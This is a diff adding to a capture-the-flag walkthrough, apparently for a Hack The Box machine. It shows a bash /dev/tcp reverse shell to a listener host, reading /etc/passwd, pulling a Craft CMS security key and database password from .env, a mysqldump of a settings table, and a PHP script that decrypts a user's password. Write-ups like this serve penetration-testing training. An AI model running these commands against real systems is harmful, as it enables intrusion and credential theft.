@@ -150,5 +150,130 @@ This command is going to upload your shell.php into the website and substitute i
 
 <img width="997" height="717" alt="image" src="https://github.com/user-attachments/assets/3973ea4a-a5d1-4e14-9e50-5b602d619096" />
 
-Now we have shell as www-data
+Now we have shell as www-data. Let's get that shell out of the browser and into the command line. Open a listener:
+````
+nc -lnvp 9001
+````
+Then execute a rever shell from the php shell:
+````
+bash -c 'bash -i >& /dev/tcp/10.13.37.182/9001 0>&1'
+````
+
+<img width="1023" height="82" alt="image" src="https://github.com/user-attachments/assets/23e0bd6e-88df-403f-acb6-a852472ac027" />
+
+/etc/passwd shows us the following:
+````
+www-data@portal:~/portal/web$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+syslog:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
+tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:106:1::/var/cache/pollinate:/bin/false
+tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
+_galera:x:109:65534::/nonexistent:/usr/sbin/nologin
+mysql:x:110:112:MariaDB Server,,,:/nonexistent:/bin/false
+aporter:x:1001:1001::/home/aporter:/bin/bash
+_runit-log:x:999:988:Created by dh-sysuser for runit:/nonexistent:/usr/sbin/nologin
+````
+
+We probably want to escalate to aporter, and line 108 of /var/www/portal/modules/htbairways/console/controllers/MilesController.php proves that:
+````
+'user' => $kv['mailRelayUser'] ?? 'aporter',
+````
+This part tells us where the encrypted password is hiding
+````
+$kv = array_column(
+    (new Query())->select(['name', 'value'])
+        ->from('{{%htbairways_settings}}')
+        ->all(),
+    'value',
+    'name'
+);
+````
+
+This tells us how it is encrypted so we can reverse it:
+````
+$password = Craft::$app->getSecurity()
+    ->decryptByKey(
+        base64_decode($kv['mailRelayPassword']),
+        $securityKey
+    );
+````
+
+And finally where the encryption key is:
+````
+$securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;
+````
+
+Now we have all of the pieces of the puzzle, we just have to find them and get them. Go to ~/portal and:
+````
+cat ./env
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_TABLE_PREFIX=
+````
+Use mysqldump to get the crypted password:
+````
+mysqldump -h 127.0.0.1 -P 3306 -u craftuser -p craft htbairways_settings
+````
+We have it:
+mysqldump -h 127.0.0.1 -P 3306 -u craftuser -p craft htbairways_settings
+Now that we have the key and the encrypted password, let's make a php program to decrypt it:
+````
+<?php
+require '/var/www/portal/vendor/autoload.php';
+$s = new yii\base\Security();
+$blob = base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=');
+echo $s->decryptByKey($blob, 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'), "\n";
+EOF
+php /tmp/dec.php
+>
+````
+The output of this is aporter's password: Skyp0rt_Relay!26
+
+Now just su aporter and get user.txt:
+
+<img width="1021" height="198" alt="image" src="https://github.com/user-attachments/assets/4badb8b2-6fb8-4a91-972d-763ecc4790fe" />
+
+First of all a internal port scan:
+
+
+
+
 
